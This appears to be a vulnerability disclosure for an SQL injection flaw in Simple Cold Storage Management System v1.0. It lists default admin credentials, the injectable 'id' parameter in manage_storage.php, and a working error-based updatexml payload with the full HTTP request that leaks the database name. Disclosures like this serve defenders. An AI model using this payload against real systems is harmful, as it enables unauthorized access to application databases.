# Simple Cold Storage Management System v1.0 by oretnom23 has SQL injection

BUG_Author: oner

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15088/simple-cold-storage-management-system-using-phpoop-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /csms/admin/storages/manage_storage.php?id=

Vulnerability location: /csms/admin/storages/manage_storage.php?id=, id

dbname =csms_db,length=7

[+] Payload: /csms/admin/storages/manage_storage.php?id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> id

```sql
GET /csms/admin/storages/manage_storage.php?id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=d8pesjl7i2jtmf2qddggbp7q0b
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/191013912-3a3628c2-c6bc-4b4c-8ea2-a3ded0fc585c.png)
